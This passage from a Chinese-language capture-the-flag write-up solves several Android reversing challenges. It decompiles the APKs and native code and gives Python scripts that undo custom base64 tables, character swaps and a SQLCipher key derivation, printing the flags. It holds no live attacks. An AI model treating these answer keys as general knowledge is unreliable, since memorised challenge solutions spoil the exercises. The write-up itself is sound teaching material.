findViewById(R.id.textView1);        this.c.setText(Encryto.decode(this, &quot;9YuQ2dk8CSaCe7DTAmaqAA==&quot;));    }}</code></pre><p>最后用这里的密文解密得到了 flag：</p><pre><code class="python">...ciphertext2 = &#39;9YuQ2dk8CSaCe7DTAmaqAA==&#39;.decode(&#39;base64&#39;)print aes.decrypt(ciphertext2)# Cas3_0f_A_CAK3</code></pre><h1 id="app3"><a href="#app3" class="headerlink" title="app3"></a>app3</h1><p>拿到文件用 file 没有识别出来，xxd 看一下：</p><pre><code class="bash">$ xxd app3.ab | head00000000: 414e 4452 4f49 4420 4241 434b 5550 0a32  ANDROID BACKUP.200000010: 0a31 0a6e 6f6e 650a 78da e47a e55f 936f  .1.none.x..z._.o00000020: fcaf 8a74 8e1e 0d1b 5d63 0361 303a 4797  ...t....]c.a0:G.00000030: 8422 3d06 8ab4 c248 a507 a373 3046 2328  .&quot;=....H...s0F#(00000040: 2a65 a088 d20c 4623 8222 4883 a252 5202  *e....F#.&quot;H..RR.00000050: 9e7d 7fe7 75fe 80f3 e43c 39d7 93fb 75bf  .}..u....&lt;9...u.00000060: b6dd d775 7de2 1df7 2e8f a0a0 5045 afc0  ...u}.......PE..00000070: bb0a a808 8fbb 41fe 2805 8c47 902f 2a2c  ......A.(..G./*,00000080: d4d7 2340 210c 15e0 850a 080b 47f9 53be  ..#@!.......G.S.00000090: 8052 f450 f4f4 0845 2978 04dd b9f4 7f37  .R.P...E)x.....7</code></pre><p>搜了一下发现是安卓备份文件，可以用 Android Backup Extractor 来解压：</p><pre><code class="bash">$ java -jar abe.jar unpack app3.ab app3.tar &quot;&quot;0% 1% 2% 3% 4% 5% 6% 7% 8% 9% 10% 11% 12% 13% 14% 15% 16% 17% 18% 19% 20% 21% 22% 23% 24% 25% 26% 27% 28% 29% 30% 31% 32% 33% 34% 35% 36% 37% 38% 39% 40% 41% 42% 43% 44% 45% 46% 47% 48% 49% 50% 51% 52% 53% 54% 55% 56% 57% 58% 59% 60% 61% 62% 63% 64% 65% 66% 67% 68% 69% 70% 71% 72% 73% 74% 75% 76% 77% 78% 79% 80% 81% 82% 83% 84% 85% 86% 87% 88% 89% 90% 91% 92% 93% 94% 95% 96% 97% 98% 99% 100%9097216 bytes written to /Users/assassinq/Downloads/app3.tar.</code></pre><p>在解压得到的 tar 包：</p><pre><code class="bash">$ x app3.tarx apps/com.example.yaphetshan.tencentwelcome/a/base.apkx apps/com.example.yaphetshan.tencentwelcome/db/Demo.dbx apps/com.example.yaphetshan.tencentwelcome/Encryto.dbx apps/com.example.yaphetshan.tencentwelcome/_manifest</code></pre><p>生成的文件中，两个 db 都是被加密了的 sqlite 数据库。先来用 jadx 看看 base.apk，可以看到 <code>a()</code> 函数通过一些操作计算出一个密码，来获得一个数据库的接口。详细分析我记录在了注释中，其他的分析再看之后的函数：</p><pre><code class="java">package com.example.yaphetshan.tencentwelcome;import android.content.ContentValues;import android.content.Intent;import android.content.SharedPreferences.Editor;import android.os.Bundle;import android.support.v7.app.AppCompatActivity;import android.view.View;import android.view.View.OnClickListener;import android.widget.Button;import com.example.yaphetshan.tencentwelcome.a.a;import net.sqlcipher.database.SQLiteDatabase;public class MainActivity extends AppCompatActivity implements OnClickListener {    private SQLiteDatabase a;    private a b;    private Button c;    protected void onCreate(Bundle bundle) {        super.onCreate(bundle);        setContentView((int) R.layout.activity_main);        this.c = (Button) findViewById(R.id.add_data);        this.c.setOnClickListener(this);        Editor edit = getSharedPreferences(&quot;test&quot;, 0).edit();        edit.putString(&quot;Is_Encroty&quot;, &quot;1&quot;); // Is_Encroty=&quot;1&quot;        edit.putString(&quot;Encryto&quot;, &quot;SqlCipher&quot;); // Encryto=&quot;SqlCipher&quot;        edit.putString(&quot;ver_sion&quot;, &quot;3_4_0&quot;); // ver_sion=&quot;3_4_0&quot;        edit.apply();        a();    }    private void a() {        SQLiteDatabase.loadLibs(this);        this.b = new a(this, &quot;Demo.db&quot;, null, 1); // 打开Demo.db        ContentValues contentValues = new ContentValues();        contentValues.put(&quot;name&quot;, &quot;Stranger&quot;); // name=&quot;Stanger&quot;        contentValues.put(&quot;password&quot;, Integer.valueOf(123456)); // password=123456        a aVar = new a();        String a = aVar.a(contentValues.getAsString(&quot;name&quot;), contentValues.getAsString(&quot;password&quot;)); // a = name[:4] + password[:4]        this.a = this.b.getWritableDatabase(aVar.a(a + aVar.b(a, contentValues.getAsString(&quot;password&quot;))).substring(0, 7)); // 将SHA1(a+MD5(a)+&quot;yaphetshan&quot;)[:7]作为密码，获取指定数据库接口        this.a.insert(&quot;TencentMicrMsg&quot;, null, contentValues); // 将数据contentValues插入表TencentMicrMsg    }    public void onClick(View view) {        if (view == this.c) {            Intent intent = new Intent();            intent.putExtra(&quot;name&quot;, &quot;name&quot;);            intent.putExtra(&quot;password&quot;, &quot;pass&quot;);            intent.setClass(this, AnotherActivity.class);            startActivity(intent);        }    }}</code></pre><p>在同一包下的 a 类中，看到了数据库 TencentMicrMsg 的结构，其中有一个 F_l_a_g 字段，可以判断是 flag：</p><pre><code class="java">package com.example.yaphetshan.tencentwelcome;import android.content.Context;import net.sqlcipher.database.SQLiteDatabase;import net.sqlcipher.database.SQLiteDatabase.CursorFactory;import net.sqlcipher.database.SQLiteOpenHelper;/* compiled from: DatabaseManager */public class a extends SQLiteOpenHelper {    private int a = 0;    public a(Context context, String str, CursorFactory cursorFactory, int i) { // 打开指定数据库        super(context, str, cursorFactory, i);    }    public void onCreate(SQLiteDatabase sQLiteDatabase) {        sQLiteDatabase.execSQL(&quot;create table TencentMicrMsg(name text,password integer,F_l_a_g text)&quot;); // 表TencentMicrMsg中三个字段分别是text、integer和text    }    public void onUpgrade(SQLiteDatabase sQLiteDatabase, int i, int i2) {    }}</code></pre><p>在包 a 下的 a 类，其中两个函数可以根据 b 类的函数分析得到功能：</p><pre><code class="java">package com.example.yaphetshan.tencentwelcome.a;/* compiled from: Cipher */public class a {    private String a = &quot;yaphetshan&quot;;    public String a(String str, String str2) {        String substring = str.substring(0, 4);        return substring + str2.substring(0, 4);    }    public String b(String str, String str2) { // 返回MD5十六进制字符串        b bVar = new b();        return b.a(str);    }    public String a(String str) { // 返回SHA1(str+&quot;yaphetshan&quot;)的十六进制字符串        b bVar = new b();        return b.b(str + this.a);    }}</code></pre><p>包 a 下的 b 类，根据 MessageDigest 创建的实例可以分别判断出是获取 MD5 和 SHA-1 的十六进制摘要：</p><pre><code class="java">package com.example.yaphetshan.tencentwelcome.a;import java.security.MessageDigest;/* compiled from: SHA1Manager */public class b {    public static final String a(String str) { // 获取MD5十六进制字符串        int i = 0;        char[] cArr = new char[]{&#39;0&#39;, &#39;1&#39;, &#39;2&#39;, &#39;3&#39;, &#39;4&#39;, &#39;5&#39;, &#39;6&#39;, &#39;7&#39;, &#39;8&#39;, &#39;9&#39;, &#39;a&#39;, &#39;b&#39;, &#39;c&#39;, &#39;d&#39;, &#39;e&#39;, &#39;f&#39;};        try {            byte[] bytes = str.getBytes();            MessageDigest instance = MessageDigest.getInstance(&quot;MD5&quot;);            instance.update(bytes);            byte[] digest = instance.digest(); // 获取MD5哈希摘要            int length = digest.length;            char[] cArr2 = new char[(length * 2)];            int i2 = 0;            while (i &lt; length) {                byte b = digest[i];                int i3 = i2 + 1;                cArr2[i2] = cArr[(b &gt;&gt;&gt; 4) &amp; 15];                i2 = i3 + 1;                cArr2[i3] = cArr[b &amp; 15];                i++;            }            return new String(cArr2);        } catch (Exception e) {            return null;        }    }    public static final String b(String str) { // 获取SHA1十六进制字符串        int i = 0;        char[] cArr = new char[]{&#39;0&#39;, &#39;1&#39;, &#39;2&#39;, &#39;3&#39;, &#39;4&#39;, &#39;5&#39;, &#39;6&#39;, &#39;7&#39;, &#39;8&#39;, &#39;9&#39;, &#39;a&#39;, &#39;b&#39;, &#39;c&#39;, &#39;d&#39;, &#39;e&#39;, &#39;f&#39;};        try {            byte[] bytes = str.getBytes();            MessageDigest instance = MessageDigest.getInstance(&quot;SHA-1&quot;);            instance.update(bytes);            byte[] digest = instance.digest(); // 获取SHA1哈希摘要            int length = digest.length;            char[] cArr2 = new char[(length * 2)];            int i2 = 0;            while (i &lt; length) {                byte b = digest[i];                int i3 = i2 + 1;                cArr2[i2] = cArr[(b &gt;&gt;&gt; 4) &amp; 15];                i2 = i3 + 1;                cArr2[i3] = cArr[b &amp; 15];                i++;            }            return new String(cArr2);        } catch (Exception e) {            return null;        }    }}</code></pre><p>那么根据上面的分析可以正向地得到密码：</p><pre><code class="python">#!/usr/bin/env pythonimport hashlibmd5hash = lambda m: hashlib.md5(m).hexdigest()sha1hash = lambda m: hashlib.sha1(m).hexdigest()name = &quot;Stranger&quot;password = &quot;123456&quot;a = name[:4] + password[:4]database = sha1hash(a + md5hash(a) + &quot;yaphetshan&quot;)[:7]print database# ae56f99</code></pre><p>打开 Decypt.db 库，查看表中数据：</p><p><img src="/pics/攻防世界-MOBILE-新手练习区/1.png" srcset="/img/loading.gif" alt></p><p>将字段中的字符串解 base64：</p><pre><code class="bash">$ echo &quot;VGN0ZntIM2xsMF9Eb19ZMHVfTG92M19UZW5jM250IX0=&quot; | base64 -DTctf{H3ll0_Do_Y0u_Lov3_Tenc3nt!}</code></pre><h1 id="easy-apk"><a href="#easy-apk" class="headerlink" title="easy-apk"></a>easy-apk</h1><p>把 apk 拖进 jadx，反编译查看入口事件代码，判断出对输入进行了 Base64 加密：</p><pre><code class="java">package com.testjava.jack.pingan1;import android.os.Bundle;import android.support.v7.app.AppCompatActivity;import android.view.View;import android.view.View.OnClickListener;import android.widget.Button;import android.widget.EditText;import android.widget.Toast;public class MainActivity extends AppCompatActivity {    protected void onCreate(Bundle savedInstanceState) {        super.onCreate(savedInstanceState);        setContentView((int) R.layout.activity_main);        ((Button) findViewById(R.id.button)).setOnClickListener(new OnClickListener() {            public void onClick(View view) {                if (new Base64New().Base64Encode(((EditText) MainActivity.this.findViewById(R.id.editText)).getText().toString().getBytes()).equals(&quot;5rFf7E2K6rqN7Hpiyush7E6S5fJg6rsi5NBf6NGT5rs=&quot;)) {                    Toast.makeText(MainActivity.this, &quot;\u9a8c\u8bc1\u901a\u8fc7!&quot;, 1).show(); // 验证通过!                } else {                    Toast.makeText(MainActivity.this, &quot;\u9a8c\u8bc1\u5931\u8d25!&quot;, 1).show(); // 验证失败!                }            }        });    }}</code></pre><p>再看看 Base64New 类中代码，发现是一个换表的 base64：</p><pre><code class="java">package com.testjava.jack.pingan1;import android.support.v4.view.accessibility.AccessibilityNodeInfoCompat;public class Base64New {    private static final char[] Base64ByteToStr = new char[]{&#39;v&#39;, &#39;w&#39;, &#39;x&#39;, &#39;r&#39;, &#39;s&#39;, &#39;t&#39;, &#39;u&#39;, &#39;o&#39;, &#39;p&#39;, &#39;q&#39;, &#39;3&#39;, &#39;4&#39;, &#39;5&#39;, &#39;6&#39;, &#39;7&#39;, &#39;A&#39;, &#39;B&#39;, &#39;C&#39;, &#39;D&#39;, &#39;E&#39;, &#39;F&#39;, &#39;G&#39;, &#39;H&#39;, &#39;I&#39;, &#39;J&#39;, &#39;y&#39;, &#39;z&#39;, &#39;0&#39;, &#39;1&#39;, &#39;2&#39;, &#39;P&#39;, &#39;Q&#39;, &#39;R&#39;, &#39;S&#39;, &#39;T&#39;, &#39;K&#39;, &#39;L&#39;, &#39;M&#39;, &#39;N&#39;, &#39;O&#39;, &#39;Z&#39;, &#39;a&#39;, &#39;b&#39;, &#39;c&#39;, &#39;d&#39;, &#39;U&#39;, &#39;V&#39;, &#39;W&#39;, &#39;X&#39;, &#39;Y&#39;, &#39;e&#39;, &#39;f&#39;, &#39;g&#39;, &#39;h&#39;, &#39;i&#39;, &#39;j&#39;, &#39;k&#39;, &#39;l&#39;, &#39;m&#39;, &#39;n&#39;, &#39;8&#39;, &#39;9&#39;, &#39;+&#39;, &#39;/&#39;};    private static final int RANGE = 255;    private static byte[] StrToBase64Byte = new byte[AccessibilityNodeInfoCompat.ACTION_CLEAR_ACCESSIBILITY_FOCUS];    public String Base64Encode(byte[] bytes) {        StringBuilder res = new StringBuilder();        for (int i = 0; i &lt;= bytes.length - 1; i += 3) {            int k;            byte[] enBytes = new byte[4];            byte tmp = (byte) 0;            for (k = 0; k &lt;= 2; k++) {                if (i + k &lt;= bytes.length - 1) {                    enBytes[k] = (byte) (((bytes[i + k] &amp; RANGE) &gt;&gt;&gt; ((k * 2) + 2)) | tmp);                    tmp = (byte) ((((bytes[i + k] &amp; RANGE) &lt;&lt; (((2 - k) * 2) + 2)) &amp; RANGE) &gt;&gt;&gt; 2);                } else {                    enBytes[k] = tmp;                    tmp = (byte) 64;                }            }            enBytes[3] = tmp;            for (k = 0; k &lt;= 3; k++) {                if (enBytes[k] &lt;= (byte) 63) {                    res.append(Base64ByteToStr[enBytes[k]]);                } else {                    res.append(&#39;=&#39;);                }            }        }        return res.toString();    }}</code></pre><p>直接改表解码：</p><pre><code class="python">#!/usr/bin/env python#-*- encoding=utf-8 -*-from utils import *base64_charset = &#39;vwxrstuopq34567ABCDEFGHIJyz012PQRSTKLMNOZabcdUVWXYefghijklmn89+/=&#39;ciphertext = &#39;5rFf7E2K6rqN7Hpiyush7E6S5fJg6rsi5NBf6NGT5rs=&#39;plaintext = decipher(ciphertext)print plaintext# 05397c42f9b6da593a3644162d36eb01</code></pre><h1 id="easyjava"><a href="#easyjava" class="headerlink" title="easyjava"></a>easyjava</h1><p>jadx 反编译，MainActivity 中看到主要是 <code>b()</code> 函数判断了 flag 的格式，下面主要是把 a 和 b 两个类的构造函数理清：</p><pre><code class="java">package com.a.easyjava;import android.os.Bundle;import android.support.v7.app.c;import android.view.View;import android.view.View.OnClickListener;import android.widget.EditText;import android.widget.Toast;import java.util.Timer;import java.util.TimerTask;public class MainActivity extends c {    private static char a(String str, b bVar, a aVar) {        return aVar.a(bVar.a(str));    }    private static Boolean b(String str) {        int i = 0;        if (!str.startsWith(&quot;flag{&quot;)) {            return Boolean.valueOf(false);        }        if (!str.endsWith(&quot;}&quot;)) {            return Boolean.valueOf(false);        }        String substring = str.substring(5, str.length() - 1);        b bVar = new b(Integer.valueOf(2));        a aVar = new a(Integer.valueOf(3));        StringBuilder stringBuilder = new StringBuilder();        int i2 = 0;        while (i &lt; substring.length()) {            stringBuilder.append(a(substring.charAt(i) + &quot;&quot;, bVar, aVar));            Integer valueOf = Integer.valueOf(bVar.b().intValue() / 25); // 将bVar中d的值除以25并赋值给valueOf            if (valueOf.intValue() &gt; i2 &amp;&amp; valueOf.intValue() &gt;= 1) {                i2++;            }            i++;        }        return Boolean.valueOf(stringBuilder.toString().equals(&quot;wigwrkaugala&quot;));    }    protected void onCreate(Bundle bundle) {        super.onCreate(bundle);        setContentView((int) R.layout.activity_main);        findViewById(R.id.button).setOnClickListener(new OnClickListener(this) {            final /* synthetic */ MainActivity b;            public void onClick(View view) {                if (MainActivity.b(((EditText) ((MainActivity) this).findViewById(R.id.edit)).getText().toString()).booleanValue()) {                    Toast.makeText(this, &quot;You are right!&quot;, 1).show();                    return;                }                Toast.makeText(this, &quot;You are wrong! Bye~&quot;, 1).show();                new Timer().schedule(new TimerTask(this) {                    final /* synthetic */ AnonymousClass1 a;                    {                        this.a = r1;                    }                    public void run() {                        System.exit(1);                    }                }, 2000);            }        });    }}</code></pre><p>a 类的构造函数，是对数组 c 的重新排列。然后在 <code>a()</code> 函数中对输入的数字和下标进行转换：</p><pre><code class="java">package com.a.easyjava;import java.util.ArrayList;public class a {    public static ArrayList&lt;Integer&gt; a = new ArrayList();    static String b = &quot;abcdefghijklmnopqrstuvwxyz&quot;;    static Integer d = Integer.valueOf(0);    Integer[] c = new Integer[]{Integer.valueOf(7), Integer.valueOf(14), Integer.valueOf(16), Integer.valueOf(21), Integer.valueOf(4), Integer.valueOf(24), Integer.valueOf(25), Integer.valueOf(20), Integer.valueOf(5), Integer.valueOf(15), Integer.valueOf(9), Integer.valueOf(17), Integer.valueOf(6), Integer.valueOf(13), Integer.valueOf(3), Integer.valueOf(18), Integer.valueOf(12), Integer.valueOf(10), Integer.valueOf(19), Integer.valueOf(0), Integer.valueOf(22), Integer.valueOf(2), Integer.valueOf(11), Integer.valueOf(23), Integer.valueOf(1), Integer.valueOf(8)};    public a(Integer num) {        int intValue;        for (intValue = num.intValue(); intValue &lt; this.c.length; intValue++) {            a.add(this.c[intValue]);        }        for (intValue = 0; intValue &lt; num.intValue(); intValue++) {            a.add(this.c[intValue]);        }    }    public static void a() {        Integer num = d;        d = Integer.valueOf(d.intValue() + 1); // 将d加一        if (d.intValue() == 25) { // 判断d是否等于25            int intValue = ((Integer) a.get(0)).intValue();            a.remove(0);            a.add(Integer.valueOf(intValue)); // 将a的第一个元素添加到最后一位            d = Integer.valueOf(0); // 将d设置成0        }    }    public char a(Integer num) {        int i = 0;        Integer valueOf = Integer.valueOf(0);        if (num.intValue() == -10) { // 判断num是否为-10            a();            return &quot; &quot;.charAt(0);        }        while (i &lt; a.size() - 1) {            if (a.get(i) == num) {                valueOf = Integer.valueOf(i); // 获取a中等于num的元素，并将valueOf设置成其下标i            }            i++;        }        a();        return b.charAt(valueOf.intValue()); // 返回下标对应的b中的字符    }}</code></pre><p>b 类中同理，也是对下标的一个转换：</p><pre><code class="java">package com.a.easyjava;import java.util.ArrayList;public class b {    public static ArrayList&lt;Integer&gt; a = new ArrayList();    static String b = &quot;abcdefghijklmnopqrstuvwxyz&quot;;    static Integer d = Integer.valueOf(0);    Integer[] c = new Integer[]{Integer.valueOf(8), Integer.valueOf(25), Integer.valueOf(17), Integer.valueOf(23), Integer.valueOf(7), Integer.valueOf(22), Integer.valueOf(1), Integer.valueOf(16), Integer.valueOf(6), Integer.valueOf(9), Integer.valueOf(21), Integer.valueOf(0), Integer.valueOf(15), Integer.valueOf(5), Integer.valueOf(10), Integer.valueOf(18), Integer.valueOf(2), Integer.valueOf(24), Integer.valueOf(4), Integer.valueOf(11), Integer.valueOf(3), Integer.valueOf(14), Integer.valueOf(19), Integer.valueOf(12), Integer.valueOf(20), Integer.valueOf(13)};    public b(Integer num) {        int intValue;        for (intValue = num.intValue(); intValue &lt; this.c.length; intValue++) {            a.add(this.c[intValue]);        }        for (intValue = 0; intValue &lt; num.intValue(); intValue++) {            a.add(this.c[intValue]);        }    }    public static void a() {        int intValue = ((Integer) a.get(0)).intValue();        a.remove(0);        a.add(Integer.valueOf(intValue)); // 将a的第一个元素添加到最后一位        b += &quot;&quot; + b.charAt(0);        b = b.substring(1, 27); // 将b的第一个元素添加到最后一位        Integer num = d;        d = Integer.valueOf(d.intValue() + 1); // 将d加一    }    public Integer a(String str) {        int i = 0;        Integer valueOf = Integer.valueOf(0);        if (b.contains(str.toLowerCase())) { // 判断字符串是否在“abcdefghijklmnopqrstuvwxyz”中            Integer valueOf2 = Integer.valueOf(b.indexOf(str)); // str在b中的起始下标            while (i &lt; a.size() - 1) {                if (a.get(i) == valueOf2) { // 获取a中与valueOf2相等的值，并设置valueOf为其下标i                    valueOf = Integer.valueOf(i);                }                i++;            }        } else {            valueOf = str.contains(&quot; &quot;) ? Integer.valueOf(-10) : Integer.valueOf(-1); // 判断字符串中是否有空格，如果有valueOf设置成-10，反之设置成-1        }        a();        return valueOf;    }    public Integer b() {        return d;    }}</code></pre><p>其中有很多条件判断不可能发生，实际的算法逻辑没有反编译出的代码这么复杂。逆向实现脚本：</p><pre><code class="python">#!/usr/bin/env pythonbArray = [17, 23, 7, 22, 1, 16, 6, 9, 21, 0, 15, 5, 10, 18, 2, 24, 4, 11, 3, 14, 19, 12, 20, 13, 8, 25]aArray = [21, 4, 24, 25, 20, 5, 15, 9, 17, 6, 13, 3, 18, 12, 10, 19, 0, 22, 2, 11, 23, 1, 8, 7, 14, 16]ciphertext = &#39;wigwrkaugala&#39;table = &#39;abcdefghijklmnopqrstuvwxyz&#39;valueOfArray = []for i in range(len(ciphertext)):    valueOfArray.append(table.index(ciphertext[i]))print valueOfArraynumArray = []for i in range(len(valueOfArray)):    numArray.append(aArray[valueOfArray[i]])print numArrayprefix = &#39;flag{&#39;suffix = &#39;}&#39;substring = &#39;&#39;for i in range(len(numArray)):    ch = table[bArray[numArray[i]]]    substring += ch    bArray.append(bArray[0])    del bArray[0]    table = (table + table[0])[1:27]flag = prefix + substring + suffixprint flag</code></pre><h1 id="easyjni"><a href="#easyjni" class="headerlink" title="easyjni"></a>easyjni</h1><p>反编译，其中调用了 a 函数，其中调用了 a 类中的 a 函数和在 libnative.so 实现的 ncheck 函数：</p><pre><code class="java">package com.a.easyjni;import android.os.Bundle;import android.support.v7.app.c;import android.view.View;import android.view.View.OnClickListener;import android.widget.EditText;import android.widget.Toast;public class MainActivity extends c {    static {        System.loadLibrary(&quot;native&quot;);    }    private boolean a(String str) {        try {            return ncheck(new a().a(str.getBytes()));        } catch (Exception e) {            return false;        }    }    private native boolean ncheck(String str);    protected void onCreate(Bundle bundle) {        super.onCreate(bundle);        setContentView((int) R.layout.activity_main);        findViewById(R.id.button).setOnClickListener(new OnClickListener(this) {            final /* synthetic */ MainActivity b;            public void onClick(View view) {                if (this.b.a(((EditText) ((MainActivity) this).findViewById(R.id.edit)).getText().toString())) {                    Toast.makeText(this, &quot;You are right!&quot;, 1).show();                } else {                    Toast.makeText(this, &quot;You are wrong! Bye~&quot;, 1).show();                }            }        });    }}</code></pre><p>a 类里的 a 函数很容易发现是个换表 base64：</p><pre><code class="java">package com.a.easyjni;public class a {    private static final char[] a = new char[]{&#39;i&#39;, &#39;5&#39;, &#39;j&#39;, &#39;L&#39;, &#39;W&#39;, &#39;7&#39;, &#39;S&#39;, &#39;0&#39;, &#39;G&#39;, &#39;X&#39;, &#39;6&#39;, &#39;u&#39;, &#39;f&#39;, &#39;1&#39;, &#39;c&#39;, &#39;v&#39;, &#39;3&#39;, &#39;n&#39;, &#39;y&#39;, &#39;4&#39;, &#39;q&#39;, &#39;8&#39;, &#39;e&#39;, &#39;s&#39;, &#39;2&#39;, &#39;Q&#39;, &#39;+&#39;, &#39;b&#39;, &#39;d&#39;, &#39;k&#39;, &#39;Y&#39;, &#39;g&#39;, &#39;K&#39;, &#39;O&#39;, &#39;I&#39;, &#39;T&#39;, &#39;/&#39;, &#39;t&#39;, &#39;A&#39;, &#39;x&#39;, &#39;U&#39;, &#39;r&#39;, &#39;F&#39;, &#39;l&#39;, &#39;V&#39;, &#39;P&#39;, &#39;z&#39;, &#39;h&#39;, &#39;m&#39;, &#39;o&#39;, &#39;w&#39;, &#39;9&#39;, &#39;B&#39;, &#39;H&#39;, &#39;C&#39;, &#39;M&#39;, &#39;D&#39;, &#39;p&#39;, &#39;E&#39;, &#39;a&#39;, &#39;J&#39;, &#39;R&#39;, &#39;Z&#39;, &#39;N&#39;};    public String a(byte[] bArr) {        StringBuilder stringBuilder = new StringBuilder();        for (int i = 0; i &lt;= bArr.length - 1; i += 3) {            byte[] bArr2 = new byte[4];            byte b = (byte) 0;            for (int i2 = 0; i2 &lt;= 2; i2++) {                if (i + i2 &lt;= bArr.length - 1) {                    bArr2[i2] = (byte) (b | ((bArr[i + i2] &amp; 255) &gt;&gt;&gt; ((i2 * 2) + 2)));                    b = (byte) ((((bArr[i + i2] &amp; 255) &lt;&lt; (((2 - i2) * 2) + 2)) &amp; 255) &gt;&gt;&gt; 2);                } else {                    bArr2[i2] = b;                    b = (byte) 64;                }            }            bArr2[3] = b;            for (int i3 = 0; i3 &lt;= 3; i3++) {                if (bArr2[i3] &lt;= (byte) 63) {                    stringBuilder.append(a[bArr2[i3]]);                } else {                    stringBuilder.append(&#39;=&#39;);                }            }        }        return stringBuilder.toString();    }}</code></pre><p>查看 native 层 ncheck 函数，是静态注册的。理一下发现是个简单的置换：</p><pre><code class="cpp">signed int __fastcall Java_com_a_easyjni_MainActivity_ncheck(_JNIEnv *a1, int a2, jstring a3){  int v3; // r8  _JNIEnv *env; // r5  jstring str; // r8  const char *utf_string; // r6  int i; // r0  char *v8; // r2  char v9; // r1  int j; // r0  bool v11; // nf  unsigned __int8 v12; // vf  int v13; // r1  signed int result; // r0  char s1[32]; // [sp+3h] [bp-35h]  char tmp; // [sp+23h] [bp-15h]  int v17; // [sp+28h] [bp-10h]  v17 = v3;  env = a1;  str = a3;  utf_string = a1-&gt;functions-&gt;GetStringUTFChars(&amp;a1-&gt;functions, a3, 0);  if ( strlen(utf_string) == 32 )               // len(str) == 32  {    i = 0;    do    {      v8 = &amp;s1[i];      s1[i] = utf_string[i + 16];               // s1[i] = str[i + 16]      v9 = utf_string[i++];      v8[16] = v9;                              // s1[i + 16] = str[i]    }    while ( i != 16 );    env-&gt;functions-&gt;ReleaseStringUTFChars(&amp;env-&gt;functions, str, utf_string);    j = 0;    do    {      v12 = __OFSUB__(j, 30);      v11 = j - 30 &lt; 0;      tmp = s1[j];      s1[j] = s1[j + 1];      s1[j + 1] = tmp;                          // s1[j], s1[j + 1] = s1[j + 1], s1[j]      j += 2;    }    while ( v11 ^ v12 );                        // while j &lt;= 30    v13 = memcmp(s1, &quot;MbT3sQgX039i3g==AQOoMQFPskB1Bsc7&quot;, 0x20u);    result = 0;    if ( !v13 )      result = 1;  }  else  {    env-&gt;functions-&gt;ReleaseStringUTFChars(&amp;env-&gt;functions, str, utf_string);    result = 0;  }  return result;}</code></pre><p>逆向把位置颠倒的字符串倒回去，再用改表的 base64 解码：</p><pre><code class="python">#!/usr/bin/env pythonfrom base64 import *base64_charset = &#39;i5jLW7S0GX6uf1cv3ny4q8es2Q+bdkYgKOIT/tAxUrFlVPzhmow9BHCMDpEaJRZN=&#39;ciphertext = &#39;MbT3sQgX039i3g==AQOoMQFPskB1Bsc7&#39;ciphertext = [ord(c) for c in ciphertext]for i in range(len(ciphertext) / 2):    ciphertext[2 * i], ciphertext[2 * i + 1] = ciphertext[2 * i + 1], ciphertext[2 * i]print ciphertextfor i in range(len(ciphertext) / 2):    ciphertext[i], ciphertext[i + 16] = ciphertext[i + 16], ciphertext[i]print ciphertextciphertext = &#39;&#39;.join([chr(c) for c in ciphertext])print ciphertext# QAoOQMPFks1BsB7cbM3TQsXg30i9g3==plaintext = decipher(ciphertext)print plaintext# flag{just_ANot#er_@p3}</code></pre><h1 id="easy-so"><a href="#easy-so" class="headerlink" title="easy-so"></a>easy-so</h1><p>用 jadx 反编译后，看到调用了 cyberpeace 类中的 CheckString 函数：</p><pre><code class="java">package com.testjava.jack.pingan2;import android.os.Bundle;import android.support.v7.app.AppCompatActivity;import android.view.View;import android.view.View.OnClickListener;import android.widget.Button;import android.widget.EditText;import android.widget.Toast;public class MainActivity extends AppCompatActivity {    protected void onCreate(Bundle savedInstanceState) {        super.onCreate(savedInstanceState);        setContentView((int) R.layout.activity_main);        ((Button) findViewById(R.id.button)).setOnClickListener(new OnClickListener() {            public void onClick(View v) {                if (cyberpeace.CheckString(((EditText) MainActivity.this.findViewById(R.id.editText)).getText().toString()) == 1) {                    Toast.makeText(MainActivity.this, &quot;\u9a8c\u8bc1\u901a\u8fc7!&quot;, 1).show(); // 验证通过!                } else {                    Toast.makeText(MainActivity.this, &quot;\u9a8c\u8bc1\u5931\u8d25!&quot;, 1).show(); // 验证失败!                }            }        });    }}</code></pre><p>看到函数在 Native 层实现：</p><pre><code class="java">package com.testjava.jack.pingan2;public class cyberpeace {    public static native int CheckString(String str);    static {        System.loadLibrary(&quot;cyberpeace&quot;);    }}</code></pre><p>发现是静态实现的函数，其中将输入调用了 TestDec，并将结果和指定字符串比较：</p><pre><code class="cpp">signed int __fastcall Java_com_testjava_jack_pingan2_cyberpeace_CheckString(_JNIEnv *a1, int a2, jstring *str){  signed int v3; // r8  const char *str_1; // r9  int v5; // r6  const char *v6; // r5  signed int v7; // r1  v3 = 0;  str_1 = a1-&gt;functions-&gt;GetStringUTFChars(&amp;a1-&gt;functions, str, 0);  v5 = strlen(str_1);  v6 = (const char *)malloc(v5 + 1);  v7 = 0;  if ( v5 != -1 )    v7 = 1;  _aeabi_memclr(&amp;v6[v5], v7);  _aeabi_memcpy((int)v6, (int)str_1, v5);  j_TestDec((int)v6);  if ( !strcmp(v6, &quot;f72c5a36569418a20907b55be5bf95ad&quot;) )    v3 = 1;  return v3;}</code></pre><p>看一下 TestDec 发现和之前一样，也是一组简单置换：</p><pre><code class="cpp">size_t __fastcall TestDec(const char *a1){  char *str; // r4  size_t i; // r5  char *v3; // r1  char v4; // r0  size_t result; // r0  int j; // r5  char *v7; // r0  char v8; // r1  unsigned int v9; // r1  str = (char *)a1;  if ( strlen(a1) &gt;= 2 )  {    i = 0;    do    {      v3 = &amp;str[i];      v4 = str[i];      str[i] = str[i + 16];      ++i;      v3[16] = v4;                              // str[i], str[i + 16] = str[i + 16], str[i]    }    while ( i &lt; strlen(str) &gt;&gt; 1 );  }  result = (unsigned __int8)*str;  if ( !*str )    return result;  *str = str[1];  str[1] = result;                              // str[0], str[1] = str[1], str[0]  result = strlen(str);  if ( result &lt; 3 )    return result;  j = 0;  do  {    v7 = &amp;str[j];    v8 = str[j + 2];    v7[2] = str[j + 3];    v7[3] = v8;                                 // str[j + 2], str[j + 3] = str[j + 3], str[j + 2]    result = strlen(str);    v9 = j + 4;    j += 2;  }  while ( v9 &lt; result );  return result;}</code></pre><p>照样学样逆一下就好了：</p><pre><code class="python">#!/usr/bin/env pythonciphertext = &#39;f72c5a36569418a20907b55be5bf95ad&#39;ciphertext = [ord(c) for c in ciphertext]ciphertext[0], ciphertext[1] = ciphertext[1], ciphertext[0]for i in range(len(ciphertext) / 2 - 1):    ciphertext[2 * i + 2], ciphertext[2 * i + 3] = ciphertext[2 * i + 3], ciphertext[2 * i + 2]print ciphertextfor i in range(len(ciphertext) / 2):    ciphertext[i], ciphertext[i + 16] = 